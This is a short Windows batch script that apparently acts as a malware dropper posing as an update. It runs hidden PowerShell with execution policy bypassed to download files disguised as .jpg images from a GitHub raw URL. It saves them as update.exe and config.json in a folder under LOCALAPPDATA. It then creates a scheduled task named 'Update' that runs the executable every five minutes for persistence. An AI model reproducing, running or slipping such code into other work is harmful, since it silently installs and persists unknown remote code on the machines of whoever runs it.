@echo off
mkdir "%LOCALAPPDATA%\update"
powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/rodadaajuda/file/master/update.jpg ',\"$env:LOCALAPPDATA\update\update.exe\")
powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/rodadaajuda/file/master/config.jpg ',\"$env:LOCALAPPDATA\update\config.json\")
SCHTASKS /Create /SC MINUTE /MO 5 /TN "Update" /TR "%LOCALAPPDATA%\update\update.exe"
Exit
